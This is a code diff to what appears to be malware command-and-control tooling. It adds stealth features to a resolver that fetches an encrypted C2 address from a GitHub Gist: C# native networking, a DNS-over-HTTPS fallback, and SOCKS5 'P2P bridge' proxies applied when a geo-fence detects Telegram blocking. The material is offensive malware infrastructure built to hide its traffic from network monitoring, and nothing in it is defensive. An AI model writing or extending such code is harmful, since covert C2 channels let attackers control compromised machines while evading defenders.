@@ -24,12 +24,27 @@ class GistResolver:
         self.gist_url = decrypt_string(gist_url_enc)
 
     def resolve(self) -> Optional[str]:
-        """Fetch and decrypt C2 address from Gist"""
+        """Fetch and decrypt C2 address from Gist (C# optimized)"""
         try:
-            # Gist URL should be the raw URL
-            response = requests.get(self.gist_url, timeout=10)
+            # 1. Try C# Native Networking (Stealthy + DoH)
+            try:
+                import clr
+                from VanguardCore import NetworkingManager
+                # Gist ID is the last part of the URL or we extract it
+                gist_id = self.gist_url.split('/')[-1]
+                data = NetworkingManager.GetGistData(gist_id, None)
+                if data:
+                    return data
+            except:
+                pass
+
+            # 2. Fallback to Python DoH
+            from core.dns_resolver import secure_resolver
+            url = secure_resolver.get_url_with_ip(self.gist_url)
+            host = self.gist_url.split('/')[2]
+            
+            response = requests.get(url, headers={"Host": host}, timeout=10)
             if response.status_code == 200:
-                # Expecting an encrypted string in the Gist content
                 return decrypt_string(response.text.strip())
         except Exception as e:
             from core.error_logger import log_error
@@ -81,7 +96,25 @@ class C2Manager:
         return self.gist_resolver.resolve()
 
     def get_current_token(self):
-        """Get current active token"""
+        """Get current active token and apply Gist proxy if blocked"""
+        from core.geo_fence import GeoFence
+        from core.bridge_manager import bridge_manager
+        
+        if GeoFence.is_tg_blocked():
+            proxy = bridge_manager.get_gist_proxy()
+            if proxy:
+                log_info(f"C2: Applying P2P Bridge Proxy: {proxy}")
+                # Apply globally to requests
+                import requests
+                proxies = {
+                    "http": f"socks5h://{proxy}",
+                    "https": f"socks5h://{proxy}"
+                }
+                # Note: This is simplified. In a full implementation, 
+                # we would use a session or hook into requests.
+                self.proxies = [f"socks5h://{proxy}"]
+                self.current_proxy_index = 0
+
         with self.lock:
             tok = self.tokens[self.current_token_index]
             return tok.strip() if isinstance(tok, str) else ""
